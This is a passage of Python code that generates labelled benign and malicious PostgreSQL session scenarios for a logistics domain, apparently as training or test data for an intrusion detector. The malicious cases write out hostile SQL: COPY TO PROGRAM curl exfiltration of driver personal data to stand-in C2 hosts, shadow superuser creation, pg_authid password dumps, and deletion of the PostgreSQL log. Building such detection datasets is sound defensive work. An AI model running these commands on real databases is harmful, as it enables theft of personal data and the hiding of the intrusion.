        "etl_scoped_copy": lambda rng, start, end: f"COPY (SELECT shipment_id, status, origin_warehouse_id FROM shipments WHERE dispatched_at > '{start}' AND dispatched_at <= '{end}') TO PROGRAM 'curl -sX POST https://warehouse.internal.example/replicate -d @-'",
        "etl_broad_copy": lambda rng: "COPY (SELECT d.license_number, d.home_address, s.dest_address, m.declared_value FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id JOIN manifests m ON m.shipment_id = s.shipment_id) TO PROGRAM 'curl -sX POST https://sync.example.net/push -d @-'",
        "audit_export_copy": "COPY (SELECT d.license_number, d.full_name, s.dest_address, m.declared_value FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id JOIN manifests m ON m.shipment_id = s.shipment_id WHERE m.declared_value > 50000) TO PROGRAM 'cat > /var/lib/postgresql/audit/customs_compliance_report.csv'",
        "senior_report_copy": lambda rng, scope_id: f"COPY (SELECT v.vehicle_id, v.plate_number, v.capacity_kg FROM vehicles v WHERE v.depot_id = '{scope_id}') TO PROGRAM 'cat > /var/lib/postgresql/reports/fleet_{scope_id}_status.csv'",
        "audit_exfil_copy": lambda rng: "COPY (SELECT d.license_number, d.home_address, d.phone, s.dest_address, m.declared_value FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id JOIN manifests m ON m.shipment_id = s.shipment_id) TO PROGRAM 'curl -sX POST https://analytics.example.net/submit -d @-'",
        "apt_broad_select": "SELECT license_number, home_address, phone, full_name FROM drivers",
        "apt_exfil_copy": lambda rng: "COPY (SELECT d.license_number, d.home_address, d.phone, s.dest_address FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id) TO PROGRAM 'curl -sX POST https://c2.example.net/data -d @-'",
        "batch_report_queries": lambda rng, scope_id, start, end: [
            f"SELECT v.depot_id, COUNT(s.shipment_id), SUM(m.weight_kg) FROM vehicles v JOIN shipments s ON s.vehicle_id = v.vehicle_id JOIN manifests m ON m.shipment_id = s.shipment_id WHERE v.depot_id = '{scope_id}' AND s.dispatched_at > '{start}' GROUP BY v.depot_id",
            f"SELECT COUNT(s.shipment_id), SUM(m.declared_value) FROM shipments s JOIN manifests m ON m.shipment_id = s.shipment_id WHERE s.dispatched_at > '{start}' AND s.dispatched_at <= '{end}' AND s.status = 'delivered'",
        ],
        "batch_report_copy": lambda rng, scope_id: f"COPY (SELECT v.depot_id, COUNT(s.shipment_id), SUM(m.weight_kg) FROM vehicles v JOIN shipments s ON s.vehicle_id = v.vehicle_id JOIN manifests m ON m.shipment_id = s.shipment_id WHERE v.depot_id = '{scope_id}' GROUP BY v.depot_id) TO PROGRAM 'curl -sX POST https://reporting.internal.example/daily -d @-'",
        "cross_scope_queries": lambda rng, scope_ids: [
            f"SELECT d.depot_id, COUNT(s.shipment_id), SUM(m.weight_kg) FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id JOIN manifests m ON m.shipment_id = s.shipment_id WHERE d.depot_id IN ('{_sql_in_list(scope_ids)}') GROUP BY d.depot_id",
            f"SELECT d.full_name, d.depot_id, COUNT(s.shipment_id) FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id WHERE d.depot_id IN ('{_sql_in_list(scope_ids)}') AND s.dispatched_at > NOW() - INTERVAL '7 days' GROUP BY d.full_name, d.depot_id ORDER BY COUNT(s.shipment_id) DESC",
        ],
        "cross_scope_copy": lambda rng, scope_ids: f"COPY (SELECT d.depot_id, COUNT(s.shipment_id), SUM(m.weight_kg) FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id JOIN manifests m ON m.shipment_id = s.shipment_id WHERE d.depot_id IN ('{_sql_in_list(scope_ids)}') GROUP BY d.depot_id) TO PROGRAM 'curl -sX POST https://reports.internal.example/regional -d @-'",
        "tamper_update": lambda rng: f"UPDATE drivers SET home_address = '123 Fake St' WHERE driver_id = {_lg_random_driver_id(rng)}",
        "tamper_delete": lambda rng: f"DELETE FROM manifests WHERE shipment_id = {_lg_random_shipment_id(rng)} AND declared_value > {rng.randint(10000, 50000)}",
        "lateral_broad_select": lambda rng: "SELECT license_number, home_address, phone, full_name FROM drivers",
        "lateral_secondary_select": lambda rng: f"SELECT shipment_id, dest_address, driver_id FROM shipments WHERE status = 'in_transit'",
        "lateral_exfil_copy": lambda rng: "COPY (SELECT d.license_number, d.home_address, s.dest_address, m.declared_value FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id JOIN manifests m ON m.shipment_id = s.shipment_id) TO PROGRAM 'curl -sX POST https://c2.example.net/harvest -d @-'",
        "hard_neg_etl_copy": lambda rng, scope_id, start, end: f"COPY (SELECT d.license_number, s.shipment_id, s.origin_warehouse_id FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id WHERE d.depot_id = '{scope_id}') TO PROGRAM 'curl -sX POST https://replica.internal.example/sync -d @-'",
        "frontline_report_copy": lambda rng, scope_id: f"COPY (SELECT s.shipment_id, s.status, s.dest_address FROM shipments s JOIN drivers d ON d.driver_id = s.driver_id WHERE d.depot_id = '{scope_id}' AND s.dispatched_at > NOW() - INTERVAL '1 day') TO PROGRAM 'cat > /var/lib/postgresql/reports/depot_{scope_id}_daily.csv'",
    },
}


# ============================================================================
# Generic domain-parameterized scenario generators
# ============================================================================

# ============================================================================
# Generic domain-parameterized scenario generators
# ============================================================================

def make_frontline_routine_benign(cfg, rng, idx) -> dict:
    """Benign frontline role session — scoped queries, own scope."""
    scope_id = rng.choice(cfg["scope_ids"])
    queries = cfg["benign_frontline_queries"](rng, rng.randint(2, 5))
    events = [{"sql": q} for q in queries]
    report_file = f"/var/lib/postgresql/reports/{cfg['scope_name']}_{scope_id}_daily.csv"
    events.append({
        "step_id": "daily_report",
        "sql": cfg["frontline_report_copy"](rng, scope_id)
    })
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"{cfg['domain']}_{cfg['frontline_role']}_routine_{idx:04d}",
        "family_id": f"{cfg['domain']}_{cfg['frontline_role']}_routine_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.randint(9, 16):02d}:{rng.choice(['00', '15', '30', '45'])}",
        "default_class": "benign",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": f"{cfg['frontline_role']}_work",
            "role": cfg["frontline_role"],
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(1.5, 4.0)]},
            "events": events
        }]
    }


def make_frontline_pii_dump_malicious(cfg, rng, idx) -> dict:
    """Malicious frontline role — reads PII cross-scope, dumps via COPY."""
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    scope_id = rng.choice(cfg["scope_ids"])
    variant = (idx % 3) + 1
    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
    base_select = cfg["pii_dump_sql"](rng, scope_id)
    
    return {
        "scenario_id": f"{cfg['domain']}_{cfg['frontline_role']}_pii_dump_{idx:04d}",
        "family_id": f"{cfg['domain']}_{cfg['frontline_role']}_pii_dump_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.randint(10, 15):02d}:{rng.choice(['00', '15', '30', '45'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "pii_dump",
            "role": cfg["frontline_role"],
            "class": "malicious",
            "anchor": "db",
            "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.3, 1.5)]},
            "events": [
                {"sql": base_select},
                {"step_id": "exfil",
                 "sql": f"COPY ({base_select}) TO PROGRAM '{exfil_cmd}'",
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }


def make_etl_benign(cfg, rng, idx) -> dict:
    """Benign ETL replication — scoped, incremental, to approved endpoint."""
    start, end = _random_date_range(rng)
    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"{cfg['domain']}_etl_repl_ben_{idx:04d}",
        "family_id": f"{cfg['domain']}_etl_pair_fam{variant:02d}",
        "domain": cfg["domain"],
        "matched_pair_id": f"{cfg['domain']}_etl_pair_{idx:04d}",
        "matched_dimensions": {
            "fixed": ["process_tree_shape", "role"],
            "varied": ["sql_content", "connects_to_destination"]
        },
        "time_of_day": f"{rng.choice(['01', '02', '03', '04'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "benign",
        "rule_engine_relationship": "benign_false_positive",
        "sessions": [{
            "session_label": "replication",
            "role": cfg["etl_role"],
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 5.0)]},
            "events": [
                {"step_id": "replicate",
                 "sql": cfg["etl_scoped_copy"](rng, start, end),
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }


def make_etl_exfil_malicious(cfg, rng, idx) -> dict:
    """Malicious ETL — broad columns, no filter, external endpoint."""
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"{cfg['domain']}_etl_exfil_mal_{idx:04d}",
        "family_id": f"{cfg['domain']}_etl_pair_fam{variant:02d}",
        "domain": cfg["domain"],
        "matched_pair_id": f"{cfg['domain']}_etl_pair_{idx:04d}",
        "matched_dimensions": {
            "fixed": ["process_tree_shape", "role"],
            "varied": ["sql_content", "connects_to_destination"]
        },
        "time_of_day": f"{rng.choice(['01', '02', '03', '04'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "replication",
            "role": cfg["etl_role"],
            "class": "malicious",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 5.0)]},
            "events": [
                {"step_id": "replicate",
                 "sql": cfg["etl_broad_copy"](rng),
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }


def make_privilege_abuse_malicious(cfg, rng, idx) -> dict:
    """Malicious — frontline escalates to superuser, dumps credentials."""
    password = _random_password(rng)
    shadow_role = rng.choice(["svc_shadow", "admin_backup", "dba_maint", "sec_ops", "audit_adm"])
    variant = (idx % 3) + 1
    scope_id = rng.choice(cfg["scope_ids"])
    return {
        "scenario_id": f"{cfg['domain']}_priv_abuse_{idx:04d}",
        "family_id": f"{cfg['domain']}_priv_abuse_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.choice(['02', '03', '04', '22', '23'])}:{rng.choice(['00', '15', '30', '45'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "escalate_and_dump",
            "role": cfg["frontline_role"],
            "class": "malicious",
            "anchor": "db",
            "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.5, 1.8)]},
            "events": [
                {"step_id": "escalate",
                 "sql": f"CREATE ROLE {shadow_role} SUPERUSER LOGIN PASSWORD '{password}'"},
                {"sql": cfg["pii_dump_sql"](rng, scope_id)},
                {"step_id": "dump",
                 "sql": "COPY (SELECT rolname, rolpassword FROM pg_authid) TO PROGRAM 'cat >> /var/lib/postgresql/.cache/creds_dump.txt'"},
            ]
        }]
    }


def make_audit_benign(cfg, rng, idx) -> dict:
    """Benign audit — enterprise-wide sensitive reads."""
    queries = cfg["audit_queries"](rng, rng.randint(2, 4))
    events = [{"sql": q} for q in queries]
    events.append({
        "step_id": "audit_export",
        "sql": cfg["audit_export_copy"]
    })
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"{cfg['domain']}_{cfg['audit_role']}_audit_{idx:04d}",
        "family_id": f"{cfg['domain']}_{cfg['audit_role']}_audit_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.randint(9, 16):02d}:00",
        "default_class": "benign",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "audit",
            "role": cfg["audit_role"],
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(3.0, 8.0)]},
            "events": events
        }]
    }


def make_defense_impairment_malicious(cfg, rng, idx) -> dict:
    """Malicious — disable logging via ALTER SYSTEM SET, then truncate audit logs."""
    variant = (idx % 3) + 1
    events = generate_log_tampering_commands(rng)
    return {
        "scenario_id": f"{cfg['domain']}_defense_impair_{idx:04d}",
        "family_id": f"{cfg['domain']}_defense_impair_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.choice(['01', '02', '03', '23'])}:{rng.choice(['00', '15', '30', '45'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "impair_defenses",
            "role": cfg["frontline_role"],
            "class": "malicious",
            "anchor": "db",
            "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.3, 1.5)]},
            "events": events
        }]
    }


def make_senior_eod_benign(cfg, rng, idx) -> dict:
    """Benign senior role — end of day / reconciliation report."""
    scope_id = rng.choice(cfg["scope_ids"])
    queries = cfg["benign_senior_queries"](rng, rng.randint(2, 4))
    events = [{"sql": q} for q in queries]
    events.append({
        "step_id": "eod_report",
        "sql": cfg["senior_report_copy"](rng, scope_id)
    })
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"{cfg['domain']}_{cfg['senior_role']}_eod_{idx:04d}",
        "family_id": f"{cfg['domain']}_{cfg['senior_role']}_eod_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.randint(16, 18):02d}:{rng.choice(['00', '30'])}",
        "default_class": "benign",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "eod",
            "role": cfg["senior_role"],
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 5.0)]},
            "events": events
        }]
    }


def make_audit_exfil_malicious(cfg, rng, idx) -> dict:
    """Malicious audit role — exfiltrates PII to external endpoint (false negative)."""
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    audit_sql = cfg["audit_queries"](rng, 1)[0]
    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"{cfg['domain']}_{cfg['audit_role']}_exfil_{idx:04d}",
        "family_id": f"{cfg['domain']}_{cfg['audit_role']}_exfil_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.choice(['22', '23', '01', '02'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "malicious_false_negative",
        "sessions": [{
            "session_label": "exfil",
            "role": cfg["audit_role"],
            "class": "malicious",
            "anchor": "db",
            "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.3, 1.5)]},
            "events": [
                {"sql": audit_sql},
                {"step_id": "exfil",
                 "sql": f"COPY ({audit_sql}) TO PROGRAM '{exfil_cmd}'",
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }


def make_multi_session_apt(cfg, rng, idx) -> dict:
    """Multi-session APT: recon → escalation → exfil → cleanup."""
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    password = _random_password(rng)
    variant = (idx % 3) + 1
    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
    return {
        "scenario_id": f"{cfg['domain']}_multi_apt_{idx:04d}",
        "family_id": f"{cfg['domain']}_multi_apt_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.choice(['01', '02', '03'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [
            {
                "session_label": "recon",
                "role": cfg["frontline_role"],
                "class": "malicious",
                "anchor": "db",
                "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 4.0)]},
                "events": [
                    {"sql": "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'"},
                    {"sql": f"SELECT column_name FROM information_schema.columns WHERE table_name = '{cfg['sensitive_pii_table']}'"},
                    {"step_id": "recon_probe",
                     "sql": "COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'"},
                ]
            },
            {
                "session_label": "escalate",
                "role": cfg["frontline_role"],
                "class": "malicious",
                "anchor": "db",
                "delay_after_previous_seconds": rng.uniform(5, 30),
                "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.3, 1.0)]},
                "events": [
                    {"step_id": "create_shadow",
                     "sql": f"CREATE ROLE apt_shadow SUPERUSER LOGIN PASSWORD '{password}'"},
                    {"step_id": "dump_creds",
                     "sql": "COPY (SELECT rolname FROM pg_authid) TO PROGRAM 'cat >> /tmp/.cache/roles.txt'"},
                ]
            },
            {
                "session_label": "exfil",
                "role": cfg["etl_role"],
                "class": "malicious",
                "anchor": "db",
                "delay_after_previous_seconds": rng.uniform(10, 60),
                "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 5.0)]},
                "events": [
                    {"step_id": "exfil",
                     "sql": f"COPY ({cfg['apt_broad_select']}) TO PROGRAM '{exfil_cmd}'",
                     "connects_to": {"ip": dest_ip, "port": dest_port}},
                ]
            },
        ]
    }


def make_hard_neg_dba_shadow_audit(cfg, rng, idx) -> dict:
    """Hard negative: audit role legitimately reads pg_authid for password policy audit."""
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"{cfg['domain']}_dba_shadow_audit_{idx:04d}",
        "family_id": f"{cfg['domain']}_dba_shadow_audit_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.randint(10, 15):02d}:00",
        "default_class": "benign",
        "rule_engine_relationship": "benign_false_positive",
        "sessions": [{
            "session_label": "shadow_audit",
            "role": cfg["audit_role"],
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(3.0, 6.0)]},
            "events": [
                {"sql": "SELECT rolname, rolvaliduntil FROM pg_authid WHERE rolcanlogin = true"},
                {"step_id": "export_report",
                 "sql": "COPY (SELECT rolname, rolvaliduntil FROM pg_authid WHERE rolcanlogin = true) TO PROGRAM 'cat > /var/lib/postgresql/audit/password_policy_report.csv'"},
            ]
        }]
    }


def make_hard_neg_etl_internal(cfg, rng, idx) -> dict:
    """Hard negative: ETL COPY to internal host with sensitive columns — legitimate."""
    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
    start, end = _random_date_range(rng)
    scope_id = rng.choice(cfg["scope_ids"])
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"{cfg['domain']}_etl_internal_{idx:04d}",
        "family_id": f"{cfg['domain']}_etl_internal_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.choice(['02', '03', '04'])}:{rng.choice(['00', '30'])}",
        "default_class": "benign",
        "rule_engine_relationship": "benign_false_positive",
        "sessions": [{
            "session_label": "etl",
            "role": cfg["etl_role"],
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 4.0)]},
            "events": [
                {"step_id": "sync",
                 "sql": cfg["hard_neg_etl_copy"](rng, scope_id, start, end),
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }


def make_alter_role_escalation(cfg, rng, idx) -> dict:
    """Malicious — ALTER ROLE to grant superuser."""
    target_role = rng.choice([cfg["senior_role"], cfg["audit_role"]])
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    scope_id = rng.choice(cfg["scope_ids"])
    variant = (idx % 3) + 1
    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
    base_select = cfg["pii_dump_sql"](rng, scope_id)
    return {
        "scenario_id": f"{cfg['domain']}_alter_role_esc_{idx:04d}",
        "family_id": f"{cfg['domain']}_alter_role_esc_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.choice(['01', '02', '03', '23'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "escalate",
            "role": cfg["frontline_role"],
            "class": "malicious",
            "anchor": "db",
            "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.3, 1.5)]},
            "events": [
                {"sql": f"ALTER ROLE {target_role} WITH SUPERUSER"},
                {"sql": base_select},
                {"step_id": "exfil",
                 "sql": f"COPY ({base_select}) TO PROGRAM '{exfil_cmd}'",
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }


def make_cross_scope_benign(cfg, rng, idx) -> dict:
    """Benign — senior role legitimately queries multiple scopes for regional report."""
    scope_ids = rng.sample(cfg["scope_ids"], min(rng.randint(2, 4), len(cfg["scope_ids"])))
    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
    queries = cfg["cross_scope_queries"](rng, scope_ids)
    events = [{"sql": q} for q in queries]
    events.append({
        "step_id": "report_export",
        "sql": cfg["cross_scope_copy"](rng, scope_ids),
        "connects_to": {"ip": dest_ip, "port": dest_port}
    })
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"{cfg['domain']}_{cfg['senior_role']}_cross_scope_{idx:04d}",
        "family_id": f"{cfg['domain']}_{cfg['senior_role']}_cross_scope_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.randint(9, 16):02d}:{rng.choice(['00', '30'])}",
        "default_class": "benign",
        "rule_engine_relationship": "benign_false_positive",
        "sessions": [{
            "session_label": "cross_scope_report",
            "role": cfg["senior_role"],
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 6.0)]},
            "events": events
        }]
    }


def make_data_tampering_malicious(cfg, rng, idx) -> dict:
    """Malicious — direct UPDATE/DELETE on sensitive data to cover tracks."""
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"{cfg['domain']}_data_tamper_{idx:04d}",
        "family_id": f"{cfg['domain']}_data_tamper_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.choice(['01', '02', '03', '22', '23'])}:{rng.choice(['00', '15', '30', '45'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "tamper",
            "role": cfg["frontline_role"],
            "class": "malicious",
            "anchor": "db",
            "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.3, 1.5)]},
            "events": [
                {"sql": cfg["tamper_update"](rng)},
                {"sql": cfg["tamper_delete"](rng)},
                {"step_id": "cover_tracks",
                 "sql": "COPY (SELECT 'cleanup done') TO PROGRAM 'rm -f /var/log/postgresql/postgresql.log'"},
            ]
        }]
    }


def make_lateral_movement_malicious(cfg, rng, idx) -> dict:
    """Malicious — info_schema recon then cross-table harvesting."""
    dest_ip, dest_port = get_diverse_external_endpoint(rng)
    scope_id = rng.choice(cfg["scope_ids"])
    variant = (idx % 3) + 1
    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
    return {
        "scenario_id": f"{cfg['domain']}_lateral_move_{idx:04d}",
        "family_id": f"{cfg['domain']}_lateral_move_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.choice(['01', '02', '03', '23'])}:{rng.choice(['00', '15', '30'])}",
        "default_class": "malicious",
        "rule_engine_relationship": "malicious_false_negative",
        "sessions": [
            {
                "session_label": "recon",
                "role": cfg["frontline_role"],
                "class": "malicious",
                "anchor": "db",
                "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 5.0)]},
                "events": [
                    {"sql": "SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public'"},
                    {"sql": cfg["lateral_secondary_select"](rng)},
                    {"step_id": "probe",
                     "sql": "COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'"},
                ]
            },
            {
                "session_label": "harvest",
                "role": cfg["frontline_role"],
                "class": "malicious",
                "anchor": "db",
                "delay_after_previous_seconds": rng.uniform(10, 60),
                "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.5, 2.0)]},
                "events": [
                    {"sql": cfg["lateral_broad_select"](rng)},
                    {"sql": cfg["lateral_secondary_select"](rng)},
                    {"step_id": "exfil",
                     "sql": f"COPY ({cfg['lateral_broad_select'](rng)}) TO PROGRAM '{exfil_cmd}'",
                     "connects_to": {"ip": dest_ip, "port": dest_port}},
                ]
            },
        ]
    }


def make_batch_report_benign(cfg, rng, idx) -> dict:
    """Benign — scheduled batch report generation to approved internal endpoint."""
    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
    scope_id = rng.choice(cfg["scope_ids"])
    start, end = _random_date_range(rng)
    report_queries = cfg["batch_report_queries"](rng, scope_id, start, end)
    events = [{"sql": q} for q in report_queries]
    events.append({
        "step_id": "report_send",
        "sql": cfg["batch_report_copy"](rng, scope_id),
        "connects_to": {"ip": dest_ip, "port": dest_port}
    })
    variant = (idx % 3) + 1
    return {
        "scenario_id": f"{cfg['domain']}_batch_report_{idx:04d}",
        "family_id": f"{cfg['domain']}_batch_report_fam{variant:02d}",
        "domain": cfg["domain"],
        "time_of_day": f"{rng.choice(['00', '01', '05', '06'])}:{rng.choice(['00', '30'])}",
        "default_class": "benign",
        "rule_engine_relationship": "agrees",
        "sessions": [{
            "session_label": "batch_report",
            "role": cfg["etl_role"],
            "class": "benign",
            "anchor": "db",
            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(3.0, 8.0)]},
            "events": events
        }]
    }


# ============================================================================
# Category generators per domain
# ============================================================================

def get_domain_category_generators(domain: str):
    """Return (generator_func, weight) list for a given domain.
    
    Banking returns None — use the existing hardcoded generators in
    generate_batch_v2.py to avoid regression.
    """
    if domain == "banking":
        return None  # Caller should use the existing CATEGORY_GENERATORS

    cfg = DOMAIN_CONFIG[domain]

    def _wrap(func):
        """Wrap a domain-parameterized generator to match the (rng, idx) signature."""
        wrapped = lambda rng, idx: func(cfg, rng, idx)
        wrapped.__wrapped_original__ = func
        wrapped.__domain__ = cfg["domain"]
        return wrapped

    return [
        (_wrap(make_frontline_routine_benign),       3),
        (_wrap(make_frontline_pii_dump_malicious),   2),
        (_wrap(make_etl_benign),                     2),
        (_wrap(make_etl_exfil_malicious),            2),
        (_wrap(make_privilege_abuse_malicious),       2),
        (_wrap(make_audit_benign),                   3),
        (_wrap(make_defense_impairment_malicious),   2),
        (_wrap(make_senior_eod_benign),              3),
        (_wrap(make_audit_exfil_malicious),          2),
        (_wrap(make_multi_session_apt),              1),
        (_wrap(make_hard_neg_dba_shadow_audit),      1),
        (_wrap(make_hard_neg_etl_internal),          2),
        (_wrap(make_alter_role_escalation),          1),
        (_wrap(make_cross_scope_benign),             2),
        (_wrap(make_data_tampering_malicious),       2),
        (_wrap(make_lateral_movement_malicious),     1),
        (_wrap(make_batch_report_benign),            2),
    ]


# ETL pair detection helpers (used by generate_batch_v2.py for matched pair logic)
def is_etl_benign_generator(func) -> bool:
    """Check if a wrapped generator is an ETL benign type."""
    original = getattr(func, '__wrapped_original__', None)
    return original is make_etl_benign


def is_etl_malicious_generator(func) -> bool:
    """Check if a wrapped generator is an ETL malicious type."""
    original = getattr(func, '__wrapped_original__', None)
    return original is make_etl_exfil_malicious


ALL_DOMAINS = ["banking", "healthcare", "ecommerce", "logistics"]
